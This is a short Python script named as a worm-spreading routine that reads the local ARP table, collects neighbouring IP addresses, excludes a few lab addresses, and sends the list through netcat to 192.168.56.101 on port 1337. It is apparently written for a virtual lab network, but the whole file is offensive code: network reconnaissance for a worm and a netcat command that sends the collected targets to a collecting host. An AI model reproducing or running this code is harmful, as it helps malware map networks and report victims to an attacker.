#!/usr/bin/env python

import subprocess
import re

def worm_spread():

    target_ips=[]
 
    arp_list = subprocess.check_output(["arp", "-a"])

    pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'   
    
    ips = re.findall(pattern, arp_list)

    unwanted_ips = ["192.168.56.1", "192.168.56.100", "192.168.56.101"]

    for i in ips:
        if i not in unwanted_ips:
            target_ips.append(i)
    return target_ips

print(worm_spread())


def nc_listener():
    
    listen_var="echo " + str(worm_spread()) + " | nc 192.168.56.101 1337"

    subprocess.call(listen_var, shell=True)

nc_listener()
